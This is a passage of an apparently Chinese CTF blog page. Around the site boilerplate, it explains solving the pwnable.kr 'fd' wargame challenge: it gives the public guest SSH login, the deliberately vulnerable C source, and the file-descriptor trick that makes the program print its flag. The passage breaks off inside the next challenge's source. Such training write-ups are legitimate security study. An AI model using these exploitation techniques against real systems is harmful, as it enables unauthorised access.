<!DOCTYPE html>
<html lang="zh-CN">
    <!-- title -->


    

<!-- keywords -->



<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="author" content="f10@t">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="f10@t">
    
        <meta name="keywords" content="lzwgiter,f10@t's blog">
    
    <meta name="description" content="blogs from f10@t">
    <meta name="description" content="随着安全知识的学习，慢慢的开始将心静下来，耐下性子，着眼于最基础的、最根本的安全 --- 二进制。 ：学就完事了，造他！奥里给！">
<meta property="og:type" content="article">
<meta property="og:title" content="入坑Pwn之刷题补坑">
<meta property="og:url" content="https://lzwgiter.github.io/posts/bc7cb7a1.html">
<meta property="og:site_name" content="f10@t&#39;s blog">
<meta property="og:description" content="随着安全知识的学习，慢慢的开始将心静下来，耐下性子，着眼于最基础的、最根本的安全 --- 二进制。 ：学就完事了，造他！奥里给！">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221152058776.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221152725764.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221163039292.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221163940631.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221165207856.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221170609029.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221191016261.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221195343416.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221195543744.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221195631971.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221191128656.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221202830619.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221203638849.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221203837216.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221205037781.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221205159157.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221212215918.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221212612286.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221215440404.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221215529254.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221215702556.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221224551360.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221225951063.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221231854802.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222112817486.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222140558525.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222142325376.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222143958294.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222144157410.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222144850304.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222150020705.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222150239525.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222160227623.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222161627502.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222184817479.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222214833903.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222220717199.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222224734992.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222224851374.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222225347360.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222225904514.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222231511398.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222233541824.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222230537521.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222230715817.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222230514611.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200222232920951.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200223132409049.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200223132433575.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200223134554001.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200223142757591.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/2eb47c85f5a863a5c2904e529c0409a6.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200223205115065.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200223214409163.png">
<meta property="og:image" content="https://lzwgiter.github.io/img/%E8%AF%B7%E6%88%91%E5%96%9D%E6%9D%AF%E5%92%96%E5%95%A1%E5%90%A7.jpg">
<meta property="article:published_time" content="2020-02-21T06:38:37.000Z">
<meta property="article:modified_time" content="2023-10-29T07:21:16.318Z">
<meta property="article:author" content="f10@t">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lzwgiter.github.io/img/%E5%85%A5%E5%9D%91Pwn-%E5%88%B7%E9%A2%98%E8%A1%A5%E5%9D%91/image-20200221152058776.png">
    <meta http-equiv="Cache-control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="icon" href="/assets/hello.svg">
    
    <title>入坑Pwn之刷题补坑 · f10@t&#39;s blog</title>
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
    (function (w) {
        'use strict'
        // rel=preload support test
        if (!w.loadCSS) {
            w.loadCSS = function () {}
        }
        // define on the loadCSS obj
        var rp = (loadCSS.relpreload = {})
        // rel=preload feature support test
        // runs once and returns a function for compat purposes
        rp.support = (function () {
            var ret
            try {
                ret = w.document.createElement('link').relList.supports('preload')
            } catch (e) {
                ret = false
            }
            return function () {
                return ret
            }
        })()

        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
        // then change that media back to its intended value on load
        rp.bindMediaToggle = function (link) {
            // remember existing media attr for ultimate state, or default to 'all'
            var finalMedia = link.media || 'all'

            function enableStylesheet() {
                link.media = finalMedia
            }

            // bind load handlers to enable media
            if (link.addEventListener) {
                link.addEventListener('load', enableStylesheet)
            } else if (link.attachEvent) {
                link.attachEvent('onload', enableStylesheet)
            }

            // Set rel and non-applicable media type to start an async request
            // note: timeout allows this to happen async to let rendering continue in IE
            setTimeout(function () {
                link.rel = 'stylesheet'
                link.media = 'only x'
            })
            // also enable media after 3 seconds,
            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
            setTimeout(enableStylesheet, 3000)
        }

        // loop through link elements in DOM
        rp.poly = function () {
            // double check this to prevent external calls from running
            if (rp.support()) {
                return
            }
            var links = w.document.getElementsByTagName('link')
            for (var i = 0; i < links.length; i++) {
                var link = links[i]
                // qualify links to those with rel=preload and as=style attrs
                if (
                    link.rel === 'preload' &&
                    link.getAttribute('as') === 'style' &&
                    !link.getAttribute('data-loadcss')
                ) {
                    // prevent rerunning on link
                    link.setAttribute('data-loadcss', true)
                    // bind listeners to toggle media back
                    rp.bindMediaToggle(link)
                }
            }
        }

        // if unsupported, run the polyfill
        if (!rp.support()) {
            // run once at least
            rp.poly()

            // rerun poly on an interval until onload
            var run = w.setInterval(rp.poly, 500)
            if (w.addEventListener) {
                w.addEventListener('load', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            } else if (w.attachEvent) {
                w.attachEvent('onload', function () {
                    rp.poly()
                    w.clearInterval(run)
                })
            }
        }

        // commonjs
        if (typeof exports !== 'undefined') {
            exports.loadCSS = loadCSS
        } else {
            w.loadCSS = loadCSS
        }
    })(typeof global !== 'undefined' ? global : this)
</script>

    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s infinite;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }
</style>

    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
    <link rel="stylesheet" href="/css/dark.css">
    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
    <!-- algolia -->
    
    <!-- 百度统计  -->
    
        <script>
            var _hmt = _hmt || [];
            (function () {
                var hm = document.createElement("script");
                hm.src = "https://hm.baidu.com/hm.js?9ef67111f9ae4eefa278780655f0c1e3";
                var s = document.getElementsByTagName("script")[0];
                s.parentNode.insertBefore(hm, s);
            })();
        </script>
    
    <!-- 谷歌统计  -->
    
        <script>
            (function (i, s, o, g, r, a, m) {
                i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
                (i[r].q = i[r].q || []).push(arguments)
                }, i[r].l = 1 * new Date(); a = s.createElement(o),
                m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
            })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
            ga('create', 'G-8DFDYFMQP8', 'auto');
            ga('send', 'pageview');
        </script>
    
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="f10@t's blog" type="application/atom+xml">
</head>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ == undefined) {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js" />')
        }
    </script>
    
        <body class="post-body">
    
        <!-- header -->
        <header class="header header-mobile">
    <!-- top read progress line -->
    <div class="header-element">
        <div class="read-progress read-progress-feature"></div>
    </div>
    <!-- sidebar menu button -->
    <div class="header-element">
        
            <div class="header-sidebar-menu header-sidebar-menu-rounded">
        
            
                <i class="fas fa-bars"></i>
            
        </div>
    </div>
    <!-- header actions -->
    <div class="header-actions">
        <!-- theme mode switch button -->
        <span class="header-theme-btn header-element">
            <i class="fas fa-adjust"></i>
        </span>
        <!-- back to home page text -->
        <span class="home-link header-element">
            <a href=/>f10@t's blog</a>
        </span>
    </div>
    <!-- toggle banner for post layout -->
    
        
            <div class="banner">
        
            <div class="blog-title header-element">
                <a href="/">f10@t&#39;s blog</a>
            </div>
            <div class="post-title header-element">
                <a href="#" class="post-name">入坑Pwn之刷题补坑</a>
            </div>
        </div>
    
</header>

        <!-- fixed footer -->
        <footer class="footer-fixed">
    <!-- back to top button -->
    <div class="footer-fixed-element">
        
            <div class="back-top back-top-hidden back-top-rounded">
        
        
            <i class="fas fa-chevron-up"></i>
        
        </div>
    </div>
</footer>

        <!-- wrapper -->
        <div class="wrapper">
            <div class="site-intro" style="







    height:50vh;

">
    
    <!-- 主页  -->
    
        
    <!-- 404页  -->
    
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(https://source.unsplash.com/random/1600x900?landscape)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
                入坑Pwn之刷题补坑
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
                
            <!-- 404 -->
            
        </p>
        <!-- 文章页 meta -->
        
            <div class="post-intros">
                <!-- 文章页标签  -->
                
                    <div class= post-intro-tags >
    
        
        
            
        
        
        <span class="post-category" data-categories="CTF"">
            <i class="fas fa-folder post-category-icon"></i>
            <span class="post-category-text">
                CTF
            </span>
        </span>
    
    
        <a class="post-tag" href="javascript:void(0);" data-tags="CTF">CTF</a>
    
        <a class="post-tag" href="javascript:void(0);" data-tags="pwn">pwn</a>
    
</div>

                
                <!-- 文章字数统计 -->
                
                    <div class="post-intro-read">
                        <span>字数统计: <span class="post-count word-count">14.7k</span>阅读时长: <span class="post-count reading-time">67 min</span></span>
                    </div>
                
                <div class="post-intro-meta">
                    <!-- 撰写日期 -->
                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
                    <span class="post-intro-time">2020/02/21</span>
                    <!-- busuanzi -->
                    
                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
                            <span id="busuanzi_value_page_pv"></span>
                        </span>
                    
                    <!-- 文章分享 -->
                    <span class="share-wrapper">
                        <span class="iconfont-archer share-icon">&#xe71d;</span>
                        <span class="share-text">Share</span>
                        <ul class="share-list">
                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
                                <div class="share-qrcode"></div>
                            </li>
                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
                        </ul>
                    </span>
                </div>
            </div>
        
    </div>
</div>

            <script>
  // get user agent
  function getBrowserVersions() {
    var u = window.navigator.userAgent
    return {
      userAgent: u,
      trident: u.indexOf('Trident') > -1, //IE内核
      presto: u.indexOf('Presto') > -1, //opera内核
      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
      iPad: u.indexOf('iPad') > -1, //是否为iPad
      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
    }
  }
  var browser = {
    versions: getBrowserVersions(),
  }
  console.log('userAgent: ' + browser.versions.userAgent)

  // callback
  function fontLoaded() {
    console.log('font loaded')
    if (document.getElementsByClassName('site-intro-meta')) {
      document
        .getElementsByClassName('intro-title')[0]
        .classList.add('intro-fade-in')
      document
        .getElementsByClassName('intro-subtitle')[0]
        .classList.add('intro-fade-in')
      var postIntros = document.getElementsByClassName('post-intros')[0]
      if (postIntros) {
        postIntros.classList.add('post-fade-in')
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb() {
    if (browser.versions.uc) {
      console.log('UCBrowser')
      fontLoaded()
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular'],
        },
        loading: function () {
          // 所有字体开始加载
          // console.log('font loading');
        },
        active: function () {
          // 所有字体已渲染
          fontLoaded()
        },
        inactive: function () {
          // 字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout')
          fontLoaded()
        },
        timeout: 5000, // Set the timeout to two seconds
      })
    }
  }

  function asyncErr() {
    console.warn('script load from CDN failed, will load local script')
  }

  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document,
      t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0]
    o.src = u
    if (cb) {
      o.addEventListener(
        'load',
        function (e) {
          cb(null, e)
        },
        false
      )
    }
    if (err) {
      o.addEventListener(
        'error',
        function (e) {
          err(null, e)
        },
        false
      )
    }
    s.parentNode.insertBefore(o, s)
  }

  var asyncLoadWithFallBack = function (arr, success, reject) {
    var currReject = function () {
      reject()
      arr.shift()
      if (arr.length) async(arr[0], success, currReject)
    }

    async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack(
    [
      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
      "/lib/webfontloader.min.js",
    ],
    asyncCb,
    asyncErr
  )
</script>

            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
            <div class="container container-unloaded">
                <main class="main post-page">
    <article class="article-entry">
        <blockquote>
<p>随着安全知识的学习，慢慢的开始将心静下来，耐下性子，着眼于最基础的、最根本的安全
--- 二进制。</p>
<p>：学就完事了，造他！奥里给！</p>
</blockquote>
<span id="more"></span>
<h1 id="序言">序言</h1>
<p>自从接触了一些简单的溢出攻击，参加学习了电子取证中的内存取证后，慢慢发现了溢出原理的攻击手段其实是一种很经典的攻击手段，起源于程序员对代码逻辑编写的不合理、处理的不恰当、资源分配方式不安全、使用了过时的函数等等这些，导致了攻击的产生。</p>
<p>上学期学习了一门逆向工程的课，虽说原来看过一些逆向的题目，不过大多都是一些杂项题，也没有静下心去深入了解，学完这门课后心里才对这个方向有了轮廓。比如很经典的代码注入攻击吧，现在的APT攻击很多都是采用的这种手段，想着法子的对内存进行操作，这也体现内存取证的必要性。</p>
<blockquote>
<p>世之奇伟、瑰怪，非常之观，常在于险远，而人之所罕至焉，故非有志者不能至也。</p>
</blockquote>
<p>耐下性子才能学好这里面的学问。</p>
<h1 id="pwnable.kr习题">Pwnable.kr习题</h1>
<blockquote>
<p>有一说一超喜欢pwnable的图标哈哈哈</p>
</blockquote>
<h2 id="fd">fd</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Mommy! what is a file descriptor in Linux?</span><br><span class="line"></span><br><span class="line">* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:</span><br><span class="line">https://youtu.be/971eZhMHQQw</span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
<p>ssh过去看下结果：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221152058776.png" style="zoom:80%;" /></p>
<p>(辣必不可能让你直接看哈哈，查看源代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;	<span class="comment">//将第一个参数转为整型</span></span><br><span class="line">	<span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">	len = read(fd, buf, <span class="number">32</span>);		<span class="comment">//从fd中读取数据到bug中</span></span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;	 <span class="comment">//如果buf中的内容为&quot;LETMEWIN&quot;就结束</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很简单，在Linux中，0是标准输入，1是标准输出，2是错误，所以这里只要让fd等于1就好了，即0x1235，之后会等待输入，再输入<code>LETMEWIN</code>字符串就好了：</p>
<p><img src="/img/入坑Pwn-刷题补坑/image-20200221152725764.png" style="zoom:80%;" /></p>
<h2 id="collision">collision</h2>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Daddy told me about cool MD5 hash collision today.</span><br><span class="line">I wanna do something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 